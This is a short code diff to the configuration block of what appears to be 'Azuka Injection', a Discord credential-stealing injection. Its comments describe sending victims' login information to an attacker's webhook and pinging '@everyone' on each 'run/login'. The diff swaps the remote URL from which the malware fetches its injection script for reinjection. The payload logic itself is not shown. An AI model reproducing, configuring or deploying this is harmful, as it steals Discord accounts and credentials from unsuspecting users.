@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Azuka Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://media.discordapp.net/attachments/992619855033421856/992620244063502397/i.jpeg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://github.com/444fugazi/injections/blob/assets/azuka_profile.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 212126126, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://cdn.discordapp.com/attachments/992619975154090035/992621254106431568/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/444fugazi/injections/assets/Injection-clean.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
